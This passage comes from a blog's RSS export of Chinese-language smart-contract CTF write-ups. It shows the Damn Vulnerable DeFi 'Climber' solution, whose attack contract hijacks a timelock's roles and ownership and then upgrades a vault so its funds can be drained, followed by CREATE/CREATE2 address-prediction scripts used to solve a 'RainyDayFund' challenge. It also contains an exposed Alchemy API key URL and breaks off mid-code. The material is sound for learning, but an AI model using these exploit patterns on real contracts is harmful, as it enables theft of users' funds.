class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/access/AccessControl.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title ClimberTimelock</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract ClimberTimelock is AccessControl &#123;</span><br><span class="line">    using Address for address;</span><br><span class="line"></span><br><span class="line">    bytes32 public constant ADMIN_ROLE = keccak256(&quot;ADMIN_ROLE&quot;);</span><br><span class="line">    bytes32 public constant PROPOSER_ROLE = keccak256(&quot;PROPOSER_ROLE&quot;);</span><br><span class="line"></span><br><span class="line">    // Possible states for an operation in this timelock contract</span><br><span class="line">    enum OperationState &#123;</span><br><span class="line">        Unknown,</span><br><span class="line">        Scheduled,</span><br><span class="line">        ReadyForExecution,</span><br><span class="line">        Executed</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Operation data tracked in this contract</span><br><span class="line">    struct Operation &#123;</span><br><span class="line">        uint64 readyAtTimestamp;   // timestamp at which the operation will be ready for execution</span><br><span class="line">        bool known;         // whether the operation is registered in the timelock</span><br><span class="line">        bool executed;      // whether the operation has been executed</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Operations are tracked by their bytes32 identifier</span><br><span class="line">    mapping(bytes32 =&gt; Operation) public operations;</span><br><span class="line"></span><br><span class="line">    uint64 public delay = 1 hours;</span><br><span class="line"></span><br><span class="line">    constructor(</span><br><span class="line">        address admin,</span><br><span class="line">        address proposer</span><br><span class="line">    ) &#123;</span><br><span class="line">        _setRoleAdmin(ADMIN_ROLE, ADMIN_ROLE);</span><br><span class="line">        _setRoleAdmin(PROPOSER_ROLE, ADMIN_ROLE);</span><br><span class="line"></span><br><span class="line">        // deployer + self administration</span><br><span class="line">        _setupRole(ADMIN_ROLE, admin);</span><br><span class="line">        _setupRole(ADMIN_ROLE, address(this));</span><br><span class="line"></span><br><span class="line">        _setupRole(PROPOSER_ROLE, proposer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getOperationState(bytes32 id) public view returns (OperationState) &#123;</span><br><span class="line">        Operation memory op = operations[id];</span><br><span class="line">        </span><br><span class="line">        if(op.executed) &#123;</span><br><span class="line">            return OperationState.Executed;</span><br><span class="line">        &#125; else if(op.readyAtTimestamp &gt;= block.timestamp) &#123;</span><br><span class="line">            return OperationState.ReadyForExecution;</span><br><span class="line">        &#125; else if(op.readyAtTimestamp &gt; 0) &#123;</span><br><span class="line">            return OperationState.Scheduled;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return OperationState.Unknown;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getOperationId(</span><br><span class="line">        address[] calldata targets,</span><br><span class="line">        uint256[] calldata values,</span><br><span class="line">        bytes[] calldata dataElements,</span><br><span class="line">        bytes32 salt</span><br><span class="line">    ) public pure returns (bytes32) &#123;</span><br><span class="line">        return keccak256(abi.encode(targets, values, dataElements, salt));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function schedule(</span><br><span class="line">        address[] calldata targets,</span><br><span class="line">        uint256[] calldata values,</span><br><span class="line">        bytes[] calldata dataElements,</span><br><span class="line">        bytes32 salt</span><br><span class="line">    ) external onlyRole(PROPOSER_ROLE) &#123;</span><br><span class="line">        require(targets.length &gt; 0 &amp;&amp; targets.length &lt; 256);</span><br><span class="line">        require(targets.length == values.length);</span><br><span class="line">        require(targets.length == dataElements.length);</span><br><span class="line"></span><br><span class="line">        bytes32 id = getOperationId(targets, values, dataElements, salt);</span><br><span class="line">        require(getOperationState(id) == OperationState.Unknown, &quot;Operation already known&quot;);</span><br><span class="line">        </span><br><span class="line">        operations[id].readyAtTimestamp = uint64(block.timestamp) + delay;</span><br><span class="line">        operations[id].known = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /** Anyone can execute what has been scheduled via `schedule` */</span><br><span class="line">    function execute(</span><br><span class="line">        address[] calldata targets,</span><br><span class="line">        uint256[] calldata values,</span><br><span class="line">        bytes[] calldata dataElements,</span><br><span class="line">        bytes32 salt</span><br><span class="line">    ) external payable &#123;</span><br><span class="line">        require(targets.length &gt; 0, &quot;Must provide at least one target&quot;);</span><br><span class="line">        require(targets.length == values.length);</span><br><span class="line">        require(targets.length == dataElements.length);</span><br><span class="line"></span><br><span class="line">        bytes32 id = getOperationId(targets, values, dataElements, salt);</span><br><span class="line"></span><br><span class="line">        for (uint8 i = 0; i &lt; targets.length; i++) &#123;</span><br><span class="line">            targets[i].functionCallWithValue(dataElements[i], values[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        require(getOperationState(id) == OperationState.ReadyForExecution);</span><br><span class="line">        operations[id].executed = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function updateDelay(uint64 newDelay) external &#123;</span><br><span class="line">        require(msg.sender == address(this), &quot;Caller must be timelock itself&quot;);</span><br><span class="line">        require(newDelay &lt;= 14 days, &quot;Delay must be 14 days or less&quot;);</span><br><span class="line">        delay = newDelay;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Analyse-9"><a href="#Analyse-9" class="headerlink" title="Analyse"></a>Analyse</h2><p>我们需要调用sweepFunds（）来把所有的代币转走，但是我们发现onlySweeper无法通过。我们发现这个是逻辑合约，因此我们可以升级合约并去掉onlySweeper来完成合约。那么难题来了，我们如何更新升级合约呢？首先我们要获得owner才有机会，owner现在是ClimberTimelock合约，而ClimberTimelock合约可以调用外部合约，但必须schedule之后一个小时才能execute，但我们发现schedule必须是onlyRole(PROPOSER_ROLE) 才可以通过。好像无解了啊，但并不是，我们发现execute是先执行功能，然后判断限制条件是否满足，那么我们可以在执行功能的时候将自己设置为Role，更新delay的时间,然后schedule那么是不是就可以成功了？成功之后我们就将owner转给自己，然后就完成题目啦</p><h2 id="Attack-2"><a href="#Attack-2" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">interface ClimberVault1&#123;&#125;</span><br><span class="line">interface ClimberTimelock1&#123;</span><br><span class="line">    function execute(address[] calldata targets,uint256[] calldata values,bytes[] calldata dataElements,bytes32 salt) external payable;</span><br><span class="line">    function schedule(address[] calldata targets,uint256[] calldata values,bytes[] calldata dataElements,bytes32 salt) external;</span><br><span class="line">&#125;</span><br><span class="line">contract attackclimber &#123;</span><br><span class="line">    ClimberVault1 public vault;</span><br><span class="line">    address payable timelock;</span><br><span class="line"></span><br><span class="line">    address[] public targets;</span><br><span class="line">    uint256[] public values;</span><br><span class="line">    bytes[] public dataElements;</span><br><span class="line">    bytes32 salt;</span><br><span class="line"></span><br><span class="line">    constructor(address _vault, address payable _timelock) &#123;</span><br><span class="line">        vault = ClimberVault1(_vault);</span><br><span class="line">        timelock = _timelock;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external &#123;</span><br><span class="line">        targets.push(timelock);</span><br><span class="line">        targets.push(timelock);</span><br><span class="line">        targets.push(address(vault));</span><br><span class="line">        targets.push(address(this));</span><br><span class="line">        </span><br><span class="line">        values.push(0);</span><br><span class="line">        values.push(0);</span><br><span class="line">        values.push(0);</span><br><span class="line">        values.push(0);</span><br><span class="line"></span><br><span class="line">        bytes memory data1 = abi.encodeWithSignature(&quot;updateDelay(uint64)&quot;, uint64(0));</span><br><span class="line">        </span><br><span class="line">        bytes memory data2 = abi.encodeWithSignature(&quot;grantRole(bytes32,address)&quot;,keccak256(&quot;PROPOSER_ROLE&quot;),address(this));</span><br><span class="line"></span><br><span class="line">        bytes memory data3 = abi.encodeWithSignature(&quot;transferOwnership(address)&quot;,msg.sender);</span><br><span class="line"></span><br><span class="line">        bytes memory data4 = abi.encodeWithSignature(&quot;schedule()&quot;);</span><br><span class="line"></span><br><span class="line">        dataElements.push(data1);</span><br><span class="line">        dataElements.push(data2);</span><br><span class="line">        dataElements.push(data3);</span><br><span class="line">        dataElements.push(data4);</span><br><span class="line"></span><br><span class="line">        salt=keccak256(&quot;66&quot;);</span><br><span class="line"></span><br><span class="line">        ClimberTimelock1(timelock).execute(targets, values, dataElements, salt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function schedule() external &#123;</span><br><span class="line">        ClimberTimelock1(timelock).schedule(targets, values, dataElements, salt);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后attack之后我就是owner了，然后执行upgradeToAndCall（address ， bytes memory data）就可以了</p><p>更新的合约可以是，然后传入sweepFunds的selector就完成合约了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract UpgradedAttacker is Initializable, OwnableUpgradeable, UUPSUpgradeable &#123;</span><br><span class="line"></span><br><span class="line">    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;</span><br><span class="line">    uint256 public constant WAITING_PERIOD = 15 days;</span><br><span class="line"></span><br><span class="line">    uint256 private _lastWithdrawalTimestamp;</span><br><span class="line">    address private _sweeper;</span><br><span class="line">    </span><br><span class="line">    function sweepFunds(address tokenAddress) external  &#123;</span><br><span class="line">        IERC20 token = IERC20(tokenAddress);</span><br><span class="line">        require(token.transfer(msg.sender, token.balanceOf(address(this))), &quot;Transfer failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    function _authorizeUpgrade(address newImplementation) internal override &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -靶场 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Creat与Creat2</title>
      <link href="/2023/07/22/solidity/%E7%B2%BE%E5%8D%8E/Creat%E4%B8%8ECreat2/"/>
      <url>/2023/07/22/solidity/%E7%B2%BE%E5%8D%8E/Creat%E4%B8%8ECreat2/</url>
      
        <content type="html"><![CDATA[<h1 id="Creat"><a href="#Creat" class="headerlink" title="Creat"></a>Creat</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">import</span> utils</span><br><span class="line"><span class="keyword">import</span> rlp</span><br><span class="line">w3 = Web3(Web3.HTTPProvider(</span><br><span class="line">    <span class="string">&#x27;https://eth-goerli.g.alchemy.com/v2/LpLlanLNUEgZtjfJbVeZVMe_wh3B2NXG&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getnonce</span>(<span class="params">addr</span>):</span><br><span class="line">    <span class="keyword">return</span> w3.eth.get_transaction_count(Web3.to_checksum_address(<span class="built_in">hex</span>(addr)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getaddress</span>(<span class="params">addr, nonce</span>):</span><br><span class="line">    <span class="keyword">return</span> (Web3.keccak(rlp.encode([addr, nonce]))[<span class="number">12</span>:].<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x8aC8215492Ce132Eb4d1db7EcE3eF0caF670deFf</span></span><br><span class="line">nonce = getnonce(addr)</span><br><span class="line"><span class="built_in">print</span>(nonce)</span><br><span class="line">getnextaddress = getaddress(addr, nonce)</span><br><span class="line"><span class="built_in">print</span>(getnextaddress)</span><br><span class="line">p = w3.to_checksum_address(getnextaddress)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br></pre></td></tr></table></figure><p>预测地址创建合约的下一个地址，creat方法，合约创建一个新合约，默认nonce为0</p><h1 id="Creat题目"><a href="#Creat题目" class="headerlink" title="Creat题目"></a>Creat题目</h1><h2 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.4.24;</span><br><span class="line"></span><br><span class="line">import &quot;../CtfFramework.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract DebugAuthorizer&#123;</span><br><span class="line">    </span><br><span class="line">    bool public debugMode;</span><br><span class="line"></span><br><span class="line">    constructor() public payable&#123;</span><br><span class="line">        if(address(this).balance == 1.337 ether)&#123;</span><br><span class="line">            debugMode=true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract RainyDayFund is CtfFramework&#123;</span><br><span class="line"></span><br><span class="line">    address public developer;</span><br><span class="line">    mapping(address=&gt;bool) public fundManagerEnabled;</span><br><span class="line">    DebugAuthorizer public debugAuthorizer;</span><br><span class="line"></span><br><span class="line">    constructor(address _ctfLauncher, address _player) public payable</span><br><span class="line">        CtfFramework(_ctfLauncher, _player)</span><br><span class="line">    &#123;</span><br><span class="line">        //debugAuthorizer = (new DebugAuthorizer).value(1.337 ether)(); // Debug mode only used during development</span><br><span class="line">        debugAuthorizer = new DebugAuthorizer();</span><br><span class="line">        developer = msg.sender;</span><br><span class="line">        fundManagerEnabled[msg.sender] = true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier isManager() &#123;</span><br><span class="line">        require(fundManagerEnabled[msg.sender] || debugAuthorizer.debugMode() || msg.sender == developer, &quot;Unauthorized: Not a Fund Manager&quot;);</span><br><span class="line">         _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () external payable ctf&#123;</span><br><span class="line">        // Anyone can add to the fund    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function addFundManager(address _newManager) external isManager ctf&#123;</span><br><span class="line">        fundManagerEnabled[_newManager] = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function removeFundManager(address _previousManager) external isManager ctf&#123;</span><br><span class="line">        fundManagerEnabled[_previousManager] = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() external isManager ctf&#123;</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Analyse"><a href="#Analyse" class="headerlink" title="Analyse"></a>Analyse</h2><p>题目要求转走所有的钱，因此我们需要通过isManage，而通过此修饰需要我们满足，DebugAuthorizer合约在构造的时候就有1.337 ether的代币</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">contract DebugAuthorizer&#123;</span><br><span class="line">    </span><br><span class="line">    bool public debugMode;</span><br><span class="line"></span><br><span class="line">    constructor() public payable&#123;</span><br><span class="line">        if(address(this).balance == 1.337 ether)&#123;</span><br><span class="line">            debugMode=true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们需要预测合约地址，在此合约创建之前就进行转币，以此来满足</p><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from web3 import Web3</span><br><span class="line">import utils</span><br><span class="line">import rlp</span><br><span class="line">w3 = Web3(Web3.HTTPProvider(&#x27;https://eth-goerli.g.alchemy.com/v2/LpLlanLNUEgZtjfJbVeZVMe_wh3B2NXG&#x27;))</span><br><span class="line"></span><br><span class="line">def getnonce(addr):</span><br><span class="line">    return w3.eth.get_transaction_count(Web3.to_checksum_address(hex(addr)))</span><br><span class="line"></span><br><span class="line">def getaddress(addr, nonce):</span><br><span class="line">    return (Web3.keccak(rlp.encode([addr, nonce]))[12:].hex())</span><br><span class="line"></span><br><span class="line">addr = 0x8aC8215492Ce132Eb4d1db7EcE3eF0caF670deFf</span><br><span class="line">nonce = getnonce(addr)</span><br><span class="line">print(nonce)</span><br><span class="line">contractaddress= getaddress(addr, nonce)</span><br><span class="line">getaddress=getaddress(contractaddress,1)</span><br><span class="line">print(getaddress)</span><br></pre></td></tr></table></figure><h1 id="Creat2"><a href="#Creat2" class="headerlink" title="Creat2"></a>Creat2</h1><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>语法：new contract{salt:bytes32(_salt)}(构造合约的参数)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">//SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">contract Temp&#123;</span><br><span class="line">  address public owner;</span><br><span class="line">  constructor(address _owner)&#123;</span><br><span class="line">    owner=_owner;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Deploy2&#123;</span><br><span class="line">  event Deploy(address addr);</span><br><span class="line">  function deploy(uint _salt)external&#123;</span><br><span class="line">      Temp _contract=new Temp&#123;salt:bytes32(_salt)&#125;(msg.sender);//create2方法相对于原来的方法只需加个大括号</span><br><span class="line">      emit Deploy(address(_contract));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  //预测地址</span><br><span class="line">  function getAddress(bytes memory bytecode,uint _salt)public view returns(address)&#123;</span><br><span class="line">      bytes32 hash=keccak256(abi.encodePacked(</span><br><span class="line">      bytes1(0xff),address(this),_salt,keccak256(bytecode)</span><br><span class="line">    ));</span><br><span class="line">    return address(uint160(uint(hash)));</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  //得到bytecode</span><br><span class="line">  function getBytecode(address _owner)public pure returns(bytes memory)&#123;</span><br><span class="line">    bytes memory bytecode=type(DeployWithCreate2).creationCode;</span><br><span class="line">    return abi.encodePacked(bytecode,abi.encode(_owner));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还可以通过内联汇编来creat2</p><p>语法：{a :&#x3D; create2(callvalue, add(0x20, Bytecode), mload(Bytecode), 0x01)}</p><p>CREATE2      [value        offset        length        salt]  &#x3D;&gt;&gt;四个参数</p><p>msg.value   code的起始位置     code的长度  salt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.10;</span><br><span class="line"></span><br><span class="line">contract Deployer &#123;</span><br><span class="line">    address public deployedAddr;</span><br><span class="line"></span><br><span class="line">    function deploy(bytes memory code) public &#123;</span><br><span class="line">        deployBytecode = code;</span><br><span class="line">        address a;</span><br><span class="line">        // Compile Dumper to get this bytecode</span><br><span class="line">        bytes memory dumperBytecode = hex&quot;&quot;;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            a := create2(callvalue, add(0x20, code), mload(code), 0x01)</span><br><span class="line">        &#125;</span><br><span class="line">        deployedAddr = a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="py脚本creat2"><a href="#py脚本creat2" class="headerlink" title="py脚本creat2"></a>py脚本creat2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, HTTPProvider</span><br><span class="line"></span><br><span class="line">deployingAddr = <span class="string">&#x27;d9145CCE52D386f254917e481eB44e9943F39138&#x27;</span></span><br><span class="line"></span><br><span class="line">code = <span class="string">&#x27;0x608060405234801561000f575f80fd5b5060ce8061001c5f395ff3fe6080604052348015600e575f80fd5b50600436106026575f3560e01c806306fdde0314602a575b5f80fd5b60306044565b604051603b91906081565b60405180910390f35b5f7f736d617278000000000000000000000000000000000000000000000000000000905090565b5f819050919050565b607b81606b565b82525050565b5f60208201905060925f8301846074565b9291505056fea2646970667358221220184a43afff86c72d959a260ceda2c19ec6c6724dfd0870b2bfd2484ea098e7b664736f6c63430008140033&#x27;</span></span><br><span class="line"></span><br><span class="line">s = Web3.keccak(hexstr=code)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">a = <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;%02x&#x27;</span> % b <span class="keyword">for</span> b <span class="keyword">in</span> s])</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="comment"># 去掉0x,并且补充到bytes32位</span></span><br><span class="line">salt = <span class="built_in">hex</span>(i)[<span class="number">2</span>:].rjust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(salt)</span><br><span class="line"></span><br><span class="line">p = Web3.keccak(hexstr=(<span class="string">&#x27;0xff&#x27;</span> + deployingAddr + salt + a))[<span class="number">12</span>:].<span class="built_in">hex</span>()</span><br></pre></td></tr></table></figure><h1 id="Creat2题目"><a href="#Creat2题目" class="headerlink" title="Creat2题目"></a>Creat2题目</h1><h2 id="Source-Code-1"><a href="#Source-Code-1" class="headerlink" title="Source Code"></a>Source Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 